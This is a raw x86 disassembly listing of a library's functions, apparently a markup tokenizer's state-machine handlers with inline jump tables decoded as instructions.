pop esi
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax esi
call sub_10079d70
mov edi [ ebp + 0x14 ]
push esi
call sub_100796f0
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov edi [ ebp + 0x8 ]
push 0x2
mov eax edi
call sub_10079230
mov esi [ edi + 0x8 ]
mov ecx [ r--data ]
lea ebx [ esi + 0x3c ]
add esp 0x4
cmp [ ebx + 0x4 ] 0x0
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x13
mov eax ebx
call sub_10079230
mov ecx [ ebx + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x4 ] 0x1
call sub_10079830
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push 0x15
call sub_10079230
add esp 0x4
mov eax [ ebp + 0x10 ]
push ebx
push eax
push edi
call sub_1004c3a0
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea edx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push edx
push eax
call sub_1006c7a0
lea eax [ esi + 0x94 ]
push eax
call sub_1003fa70
add esp 0xc
mov [ esi + 0x48 ] eax
sub_1007c60b
push es
push es
push es
add al [ edx ]
push es
add al [ esi ]
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add al [ esi ]
add eax [ esi ]
push es
push es
add al 0x3
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add eax [ ebx ]
add eax 0x6060606
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add ecx esp
int3
sub_1007c670
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0xc ]
mov eax [ ebx + 0x6c ]
sub eax 0x25
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov edi 0x1
je r-xdata
mov eax 0x22
sub eax edi
je r-xdata
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp + 0xc ] eax
jne r-xdata
mov [ ebx + 0x4 ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea ebx [ edi + 0x3c ]
mov [ ebp + 0x8 ] eax
jne r-xdata
mov eax 0x27
jmp r-xdata
sub eax edi
je r-xdata
push eax
push 0x26
push esi
call sub_1004c3a0
mov eax [ ebx + 0x6c ]
mov edx [ esi + 0x8 ]
add esp 0xc
pop edi
pop esi
mov [ edx ] eax
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
push ebx
push edx
push esi
call sub_1004c3a0
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax [ r--data ]
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0xc ]
push ecx
push edi
push eax
lea edx [ ebx + 0x94 ]
push edx
push esi
call sub_100102f0
mov eax [ ebp - 0xc ]
add esp 0x14
cmp eax [ r--data ]
je r-xdata
mov eax 0x3e
mov [ ebp - 0x4 ] edi
jmp r-xdata
lea eax [ edi + 0x1f ]
jmp r-xdata
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_1006c7a0
lea eax [ edi + 0x94 ]
push eax
call sub_1003fa70
mov [ edi + 0x48 ] eax
mov eax [ ebp + 0xc ]
add esp 0xc
mov ebx [ ebp + 0xc ]
mov eax [ ebx + 0x6c ]
mov edx [ esi + 0x8 ]
pop edi
pop esi
mov [ edx ] eax
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea ebx [ edi + 0x3c ]
mov [ ebp + 0x8 ] eax
jne r-xdata
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_1006c7a0
lea eax [ edi + 0x94 ]
push eax
call sub_1003fa70
add esp 0xc
mov [ edi + 0x48 ] eax
mov edx [ ebp + 0x8 ]
push ebx
push edx
push esi
call sub_1004c3a0
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_1006c7a0
lea eax [ edi + 0x94 ]
push eax
call sub_1003fa70
add esp 0xc
mov [ edi + 0x48 ] eax
sub_1007c7f0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_10079d70
mov eax [ ebp + 0x10 ]
inc eax
cmp eax 0x3f
ja r-xdata
push 0x17
mov eax ebx
call sub_10079230
mov eax [ ebx + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x4
mov [ eax ] 0x21
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
movzx eax [ eax + lookup_table_1007c8b8 ]
jmp [ eax * 4 + jump_table_1007c8a4 ]
mov ecx [ ebx + 0x8 ]
mov [ ecx ] 0x21
mov eax 0x2
pop ebx
pop ebp
retn
mov edx [ ebx + 0x8 ]
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push ebx
mov [ eax ] 0x0
call sub_100796f0
add esp 0x4
pop edi
pop ebx
pop ebp
retn
push 0x16
mov eax ebx
call sub_10079230
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10079830
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
sub_1007c8bd
add al 0x4
add al 0x4
add al 0x1
add [ ecx + eax ] eax
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x1
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007c900
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push 0x19
mov eax ebx
call sub_10079230
mov edx [ ebx + 0x8 ]
add esp 0x4
mov [ edx ] 0x0
call sub_10079830
pop ebx
mov eax 0x2
pop ebp
retn
cmp eax 0x3e
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov ecx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
mov [ edx ] 0x0
push eax
mov [ ecx + 0x78 ] 0x1
call sub_100796f0
add esp 0x4
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push 0x1a
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x4
mov [ eax ] 0x21
mov [ ecx + 0x4 ] 0x1
pop esi
mov eax 0x2
pop ebp
retn
sub_1007c990
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax 0x3e
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ edx ] 0x0
call sub_10079900
pop esi
pop ebp
retn
push ebx
mov ebx [ ebp + 0xc ]
push edi
pop edi
pop ebx
test eax eax
jne r-xdata
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push eax
push esi
call sub_1004c3a0
lea edi [ ebx + 0x94 ]
push edi
call sub_100428b0
push edi
call sub_100194e0
add esp 0x14
cmp eax 0x3e
jne r-xdata
mov eax 0xfffd
cmp eax 0xffffffff
je r-xdata
sub_1007c9f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx 0x1
push ebx
push 0x2
lea esi [ edi + 0x94 ]
push r--data
push esi
call sub_10041b90
add esp 0x10
test eax eax
je r-xdata
push 0x0
push 0x7
push r--data
push esi
call sub_10041b90
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x2d
mov [ edi + 0x4 ] ebx
pop edi
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
pop ebp
retn
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push r--data
mov [ edx ] 0x33
push esi
mov [ edi + 0x4 ] ebx
call sub_1004c490
push r--data
push esi
mov [ edi + 0x7c ] eax
call sub_1004c490
push r--data
push esi
mov [ edi + 0x80 ] eax
call sub_1004c490
add esp 0x18
mov [ edi + 0x84 ] eax
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1b
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2b
add esp 0x4
mov [ edi + 0x4 ] ebx
call sub_100793b0
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
push ebx
push 0x7
push r--data
push esi
call sub_10041b90
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x43
mov [ edi + 0x4 ] ebx
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
sub_1007caf0
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov [ edx ] 0x2f
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_1004c3a0
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007cbdc ]
jmp [ eax * 4 + jump_table_1007cbc8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x2e
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_1004c3a0
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1d
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079900
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10079900
xor eax eax
pop esi
pop ebp
retn
sub_1007cbe1
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007cc20
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_1004c3a0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_1004c3a0
add esp 0x18
pop edi
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007cd30 ]
jmp [ eax * 4 + jump_table_1007cd1c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
pop edi
mov [ edx ] 0x31
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_1004c3a0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_1004c3a0
add esp 0x1c
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1d
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10079900
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ edx ] 0x0
call sub_10079900
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_1007cd35
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add edx [ ebp - 0x75 ]
in al dx
mov eax [ ebp + 0x10 ]
push esi
cmp eax 0xffffffff
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10079900
xor eax eax
pop esi
pop ebp
retn
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_1004c3a0
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
cmp eax 0x2d
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x30
mov eax 0x2
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
add edx 0x10
push edx
push eax
push ecx
call sub_1004c3a0
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
sub_1007ce10
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0xffffffff
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1c
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079900
pop edi
xor eax eax
pop esi
pop ebp
retn
test edi edi
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2f
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_1004c3a0
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_1004c3a0
add esp 0x1c
pop edi
mov eax 0x2
pop esi
pop ebp
retn
cmp edi 0x2d
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
pop edi
mov [ ecx ] 0x31
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_1004c3a0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_1004c3a0
add esp 0x18
pop edi
mov eax 0x2
pop esi
pop ebp
retn
sub_1007cee0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x1d
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x2f
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_1004c3a0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_1004c3a0
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push edi
push esi
call sub_1004c3a0
add esp 0x28
pop edi
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007d040 ]
jmp [ eax * 4 + jump_table_1007d028 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_10079900
pop edi
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2f
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_1004c3a0
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_1004c3a0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_1004c3a0
add esp 0x28
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1e
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ ecx ] 0x32
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x1f
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_1004c3a0
add esp 0x10
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079900
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_1007d046
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020505
add eax 0x5050505
add eax 0x5050505
add eax [ 0x5050505 ]
add eax 0x5050505
add eax 0x5050505
add eax 0xec8b5504
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x2f
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_1004c3a0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_1004c3a0
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x21
push esi
call sub_1004c3a0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_1004c3a0
add esp 0x30
pop edi
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007d1f0 ]
jmp [ eax * 4 + jump_table_1007d1dc ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x30
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_1004c3a0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x2d
push esi
call sub_1004c3a0
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x21
push esi
call sub_1004c3a0
add esp 0x24
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ edx ] 0x0
call sub_10079900
pop edi
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2f
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x2d
push esi
call sub_1004c3a0
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x2d
push esi
call sub_1004c3a0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0x21
push esi
call sub_1004c3a0
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_1004c3a0
add esp 0x34
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x21
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079900
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_1007d1f5
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add edx [ ebp - 0x75 ]
in al dx
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x21
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x24
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov ecx 0x1
mov [ edx ] 0x34
add esp 0x4
mov [ eax + 0x4 ] ecx
mov [ eax + 0x88 ] ecx
lea eax [ ecx + 0x1 ]
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007d2cc ]
jmp [ eax * 4 + jump_table_1007d2c0 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x34
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
sub_1007d2cf
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ ecx ]
add [ edx ] eax
add [ edx ] eax
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add esp ecx
int3
sub_1007d2f0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax + 0x1 ]
push esi
cmp ecx 0x3f
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x35
mov edx [ ebp + 0xc ]
mov [ edx + 0x88 ] 0x0
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
movzx ecx [ ecx + lookup_table_1007d408 ]
jmp [ ecx * 4 + jump_table_1007d3f4 ]
mov edx [ ecx + 0x8 ]
add edx 0x10
push edx
push eax
push ecx
call sub_1004c3a0
add esp 0xc
add eax 0x20
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x35
mov [ eax + 0x88 ] 0x1
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_1004c3a0
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x25
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
sub_1007d40d
add al 0x4
add al 0x4
add al 0x2
add al [ edx + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_1007d450
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax + 0x1 ]
push esi
push edi
cmp ecx 0x3f
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x35
mov edx [ ebp + 0xc ]
mov [ edx + 0x88 ] 0x0
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
movzx ecx [ ecx + lookup_table_1007d59c ]
jmp [ ecx * 4 + jump_table_1007d588 ]
mov edx [ ecx + 0x8 ]
add edx 0x10
push edx
push eax
push ecx
call sub_1004c3a0
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
add eax 0x20
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ edx ] 0x36
mov eax [ edi + 0x7c ]
add edi 0x7c
push eax
push esi
call sub_10021f70
push edi
call sub_10079420
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ ecx ] 0x0
mov edx [ edi + 0x7c ]
add edi 0x7c
push edx
push esi
call sub_10021f70
push edi
call sub_10079420
mov eax [ ebp + 0x14 ]
add esp 0xc
call sub_10079680
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov ecx [ r--data ]
add eax 0x10
push eax
push ecx
push esi
call sub_1004c3a0
add esp 0x10
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
lea edi [ eax + 0x7c ]
mov [ eax + 0x88 ] 0x1
mov eax [ edi ]
push eax
push esi
call sub_10021f70
push edi
call sub_10079420
mov eax [ ebp + 0x14 ]
add esp 0x10
call sub_10079680
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_1007d5a1
add al 0x4
add al 0x4
add al 0x2
add al [ edx + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_1007d5e0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
push edi
mov edi [ ebp + 0xc ]
push 0x0
push 0x6
lea esi [ edi + 0x94 ]
push r--data
push esi
call sub_10041b90
add esp 0x10
test eax eax
je r-xdata
movzx eax [ eax + lookup_table_1007d6f4 ]
jmp [ eax * 4 + jump_table_1007d6e4 ]
push 0x0
push 0x6
push r--data
push esi
call sub_10041b90
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x37
mov [ edi + 0x4 ] 0x1
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_10079680
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079680
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x26
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
add esp 0x4
mov [ edx ] 0x42
mov [ edi + 0x88 ] 0x1
pop edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x3d
mov [ edi + 0x4 ] 0x1
pop edi
mov eax 0x2
pop esi
pop ebp
retn
sub_1007d6f8
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ecx ] eax
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add eax [ ebx ]
